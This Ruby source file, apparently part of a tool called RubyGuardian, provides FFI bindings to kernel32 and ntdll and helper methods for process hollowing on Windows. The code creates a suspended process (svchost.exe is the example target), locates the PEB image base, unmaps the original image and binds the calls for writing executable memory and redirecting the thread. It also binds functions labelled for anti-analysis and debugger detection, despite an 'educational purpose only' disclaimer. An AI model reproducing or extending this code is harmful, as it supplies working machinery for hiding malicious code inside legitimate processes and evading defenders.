# frozen_string_literal: true

# RubyGuardian Phase 1a — Windows API FFI Bindings
#
# FFI bindings for kernel32.dll and ntdll.dll functions required for
# process hollowing on Windows. Provides a Ruby-native interface to
# CreateProcess, VirtualAllocEx, WriteProcessMemory, and related APIs.
#
# EDUCATIONAL PURPOSE ONLY — Authorized security research.

require 'ffi'
require_relative 'common_types'

module RubyGuardian
  module ProcessHollowing
    module FFIBindings
      # ────────────────────────────────────────────────────────────────
      # kernel32.dll — High-level Windows API
      # ────────────────────────────────────────────────────────────────
      module Kernel32
        extend FFI::Library

        # Only load on Windows; on other platforms, methods will raise
        # NotImplementedError when called.
        if PLATFORM == :windows
          ffi_lib 'kernel32'
          ffi_convention :stdcall

          # ── Process Management ──

          # Create a new process. We use the W (wide/Unicode) variant.
          # For hollowing, dwCreationFlags includes CREATE_SUSPENDED.
          attach_function :CreateProcessW, [
            :pointer,   # lpApplicationName  (LPCWSTR)
            :pointer,   # lpCommandLine      (LPWSTR)
            :pointer,   # lpProcessAttributes (LPSECURITY_ATTRIBUTES)
            :pointer,   # lpThreadAttributes  (LPSECURITY_ATTRIBUTES)
            :bool,      # bInheritHandles
            :uint32,    # dwCreationFlags
            :pointer,   # lpEnvironment
            :pointer,   # lpCurrentDirectory (LPCWSTR)
            :pointer,   # lpStartupInfo      (LPSTARTUPINFOW)
            :pointer    # lpProcessInformation (LPPROCESS_INFORMATION)
          ], :bool

          # Terminate a process (cleanup if hollowing fails).
          attach_function :TerminateProcess, [
            :pointer,   # hProcess (HANDLE)
            :uint32     # uExitCode
          ], :bool

          # ── Memory Management ──

          # Allocate memory in a remote process's address space.
          # Used to carve out space for the injected PE image.
          attach_function :VirtualAllocEx, [
            :pointer,   # hProcess          (HANDLE)
            :pointer,   # lpAddress         (LPVOID — desired base)
            :size_t,    # dwSize            (SIZE_T)
            :uint32,    # flAllocationType  (MEM_COMMIT | MEM_RESERVE)
            :uint32     # flProtect         (PAGE_EXECUTE_READWRITE)
          ], :pointer

          # Free memory in a remote process.
          attach_function :VirtualFreeEx, [
            :pointer,   # hProcess     (HANDLE)
            :pointer,   # lpAddress    (LPVOID)
            :size_t,    # dwSize       (SIZE_T)
            :uint32     # dwFreeType   (MEM_RELEASE)
          ], :bool

          # Change memory protection in a remote process.
          # Used to set proper section protections after writing.
          attach_function :VirtualProtectEx, [
            :pointer,   # hProcess       (HANDLE)
            :pointer,   # lpAddress      (LPVOID)
            :size_t,    # dwSize         (SIZE_T)
            :uint32,    # flNewProtect   (PAGE_*)
            :pointer    # lpflOldProtect (PDWORD — output)
          ], :bool

          # Query memory region information (for verification).
          attach_function :VirtualQueryEx, [
            :pointer,   # hProcess               (HANDLE)
            :pointer,   # lpAddress              (LPCVOID)
            :pointer,   # lpBuffer               (PMEMORY_BASIC_INFORMATION)
            :size_t     # dwLength               (SIZE_T)
          ], :size_t

          # ── Cross-Process I/O ──

          # Write data into a remote process's memory.
          # Core function for writing PE headers and sections.
          attach_function :WriteProcessMemory, [
            :pointer,   # hProcess               (HANDLE)
            :pointer,   # lpBaseAddress           (LPVOID)
            :pointer,   # lpBuffer               (LPCVOID)
            :size_t,    # nSize                  (SIZE_T)
            :pointer    # lpNumberOfBytesWritten  (SIZE_T*)
          ], :bool

          # Read data from a remote process's memory.
          # Used to read PEB and verify written data.
          attach_function :ReadProcessMemory, [
            :pointer,   # hProcess             (HANDLE)
            :pointer,   # lpBaseAddress        (LPCVOID)
            :pointer,   # lpBuffer             (LPVOID)
            :size_t,    # nSize                (SIZE_T)
            :pointer    # lpNumberOfBytesRead  (SIZE_T*)
          ], :bool

          # ── Thread Context ──

          # Retrieve the register state of a suspended thread.
          attach_function :GetThreadContext, [
            :pointer,   # hThread   (HANDLE)
            :pointer    # lpContext (LPCONTEXT)
          ], :bool

          # Set the register state of a suspended thread.
          # We modify Rcx/Eax to point to our entry point.
          attach_function :SetThreadContext, [
            :pointer,   # hThread   (HANDLE)
            :pointer    # lpContext (const CONTEXT*)
          ], :bool

          # Resume a suspended thread (final step of hollowing).
          attach_function :ResumeThread, [
            :pointer    # hThread (HANDLE)
          ], :uint32

          # Suspend a running thread.
          attach_function :SuspendThread, [
            :pointer    # hThread (HANDLE)
          ], :uint32

          # ── Handle Management ──

          attach_function :CloseHandle, [
            :pointer    # hObject (HANDLE)
          ], :bool

          # ── Error Handling ──

          attach_function :GetLastError, [], :uint32
          attach_function :SetLastError, [:uint32], :void

          # ── Debugging Detection ──

          attach_function :IsDebuggerPresent, [], :bool

          attach_function :CheckRemoteDebuggerPresent, [
            :pointer,   # hProcess     (HANDLE)
            :pointer    # pbDebuggerPresent (PBOOL)
          ], :bool

          # ── Timing ──

          attach_function :GetTickCount64, [], :uint64
          attach_function :QueryPerformanceCounter, [:pointer], :bool
          attach_function :QueryPerformanceFrequency, [:pointer], :bool

          # ── Process Information ──

          attach_function :GetCurrentProcess, [], :pointer
        end
      end

      # ────────────────────────────────────────────────────────────────
      # ntdll.dll — Native API (lower-level, partially undocumented)
      # ────────────────────────────────────────────────────────────────
      module Ntdll
        extend FFI::Library

        if PLATFORM == :windows
          ffi_lib 'ntdll'
          ffi_convention :stdcall

          # Unmap a section from a process's address space.
          # THIS IS THE CORE HOLLOWING API — removes the original PE image.
          #
          # @param ProcessHandle [HANDLE] Target process
          # @param BaseAddress [PVOID] Base of the section to unmap
          # @return [NTSTATUS] STATUS_SUCCESS (0) on success
          attach_function :NtUnmapViewOfSection, [
            :pointer,   # ProcessHandle (HANDLE)
            :pointer    # BaseAddress   (PVOID)
          ], :int32     # NTSTATUS

          # Query process information to find the PEB address.
          # PEB contains ImageBaseAddress which tells us where to unmap.
          #
          # @param ProcessHandle [HANDLE]
          # @param ProcessInformationClass [ULONG] 0 = ProcessBasicInformation
          # @param ProcessInformation [PVOID] Output buffer
          # @param ProcessInformationLength [ULONG] Buffer size
          # @param ReturnLength [PULONG] Actual size written
          # @return [NTSTATUS]
          attach_function :NtQueryInformationProcess, [
            :pointer,   # ProcessHandle
            :uint32,    # ProcessInformationClass
            :pointer,   # ProcessInformation (output buffer)
            :uint32,    # ProcessInformationLength
            :pointer    # ReturnLength (output)
          ], :int32     # NTSTATUS

          # Lower-level read/write (bypass kernel32 wrapper).
          attach_function :NtReadVirtualMemory, [
            :pointer,   # ProcessHandle
            :pointer,   # BaseAddress
            :pointer,   # Buffer
            :uint32,    # NumberOfBytesToRead
            :pointer    # NumberOfBytesRead (output)
          ], :int32

          attach_function :NtWriteVirtualMemory, [
            :pointer,   # ProcessHandle
            :pointer,   # BaseAddress
            :pointer,   # Buffer
            :uint32,    # NumberOfBytesToWrite
            :pointer    # NumberOfBytesWritten (output)
          ], :int32

          # Query system information (for anti-analysis).
          attach_function :NtQuerySystemInformation, [
            :uint32,    # SystemInformationClass
            :pointer,   # SystemInformation (output)
            :uint32,    # SystemInformationLength
            :pointer    # ReturnLength (output)
          ], :int32

          # Delay execution (precise sleep for timing checks).
          attach_function :NtDelayExecution, [
            :bool,      # Alertable
            :pointer    # DelayInterval (PLARGE_INTEGER — negative = relative)
          ], :int32
        end
      end

      # ────────────────────────────────────────────────────────────────
      # Windows API Convenience Wrapper
      # ────────────────────────────────────────────────────────────────
      #
      # Provides higher-level Ruby methods that wrap raw FFI calls
      # with error checking, logging, and type conversion.
      #
      module WindowsAPI
        module_function

        # Create a suspended process suitable for hollowing.
        #
        # @param target_path [String] Path to the executable (e.g., "C:\\Windows\\System32\\svchost.exe")
        # @param creation_flags [Integer] Additional creation flags (CREATE_SUSPENDED is always added)
        # @return [Hash] { process_handle:, thread_handle:, pid:, tid: }
        # @raise [RuntimeError] If CreateProcessW fails
        def create_suspended_process(target_path, creation_flags: 0)
          raise NotImplementedError, 'Windows API only available on Windows' unless PLATFORM == :windows

          # Initialize STARTUPINFO with cb (structure size)
          si = StartupInfo.new
          si[:cb] = StartupInfo.size

          # Initialize PROCESS_INFORMATION (output)
          pi = ProcessInformation.new

          # Convert path to wide string for CreateProcessW
          wide_path = TypeUtils.to_wide_string(target_path)

          # Always include CREATE_SUSPENDED
          flags = WinConstants::CREATE_SUSPENDED | creation_flags

          success = Kernel32.CreateProcessW(
            wide_path,         # lpApplicationName
            nil,               # lpCommandLine
            nil,               # lpProcessAttributes
            nil,               # lpThreadAttributes
            false,             # bInheritHandles
            flags,             # dwCreationFlags
            nil,               # lpEnvironment
            nil,               # lpCurrentDirectory
            si.pointer,        # lpStartupInfo
            pi.pointer         # lpProcessInformation
          )

          unless success
            error_code = Kernel32.GetLastError
            raise "CreateProcessW failed (error: #{error_code}): #{target_path}"
          end

          {
            process_handle: pi[:hProcess],
            thread_handle:  pi[:hThread],
            pid:            pi[:dwProcessId],
            tid:            pi[:dwThreadId]
          }
        end

        # Get the PEB base address of a process.
        #
        # @param process_handle [FFI::Pointer] Handle to the target process
        # @return [Integer] PEB base address
        def get_peb_address(process_handle)
          raise NotImplementedError, 'Windows API only available on Windows' unless PLATFORM == :windows

          pbi = ProcessBasicInformation.new
          return_length = FFI::MemoryPointer.new(:uint32)

          status = Ntdll.NtQueryInformationProcess(
            process_handle,
            0,                    # ProcessBasicInformation
            pbi.pointer,
            ProcessBasicInformation.size,
            return_length
          )

          unless status == WinConstants::STATUS_SUCCESS
            raise "NtQueryInformationProcess failed (NTSTATUS: 0x#{status.to_s(16)})"
          end

          pbi[:PebBaseAddress].address
        end

        # Read the original image base address from the PEB.
        #
        # @param process_handle [FFI::Pointer] Process handle
        # @param peb_address [Integer] PEB base address
        # @return [Integer] Original image base address
        def read_image_base(process_handle, peb_address)
          raise NotImplementedError, 'Windows API only available on Windows' unless PLATFORM == :windows

          # ImageBaseAddress is at PEB + 0x10 (x64) or PEB + 0x08 (x86)
          offset = (ARCH == :x64) ? 0x10 : 0x08
          ptr_size = (ARCH == :x64) ? 8 : 4

          buffer = FFI::MemoryPointer.new(:uint8, ptr_size)
          bytes_read = FFI::MemoryPointer.new(:size_t)

          success = Kernel32.ReadProcessMemory(
            process_handle,
            FFI::Pointer.new(:void, peb_address + offset),
            buffer,
            ptr_size,
            bytes_read
          )

          unless success
            raise "ReadProcessMemory failed reading PEB.ImageBaseAddress (error: #{Kernel32.GetLastError})"
          end

          (ARCH == :x64) ? buffer.read_uint64 : buffer.read_uint32
        end

        # Unmap the original PE image from the target process.
        #
        # @param process_handle [FFI::Pointer] Process handle
        # @param base_address [Integer] Image base to unmap
        # @return [Boolean] true on success
        def unmap_section(process_handle, base_address)
          raise NotImplementedError, 'Windows API only available on Windows' unless PLATFORM == :windows

          status = Ntdll.NtUnmapViewOfSection(
            process_handle,
            FFI::Pointer.new(:void, base_address)
          )

          unless status == WinConstants::STATUS_SUCCESS
            raise "NtUnmapViewOfSection failed (NTSTATUS: 0x#{status.to_s(16)})"
          end

          true
        end

        # Clean up process handles.
        #
        # @param handles [Hash] Hash containing :process_handle and :thread_handle
        def cleanup_handles(handles)
          return unless PLATFORM == :windows

          Kernel32.CloseHandle(handles[:process_handle]) if handles[:process_handle]
          Kernel32.CloseHandle(handles[:thread_handle])  if handles[:thread_handle]
        end
      end
    end
  end
end
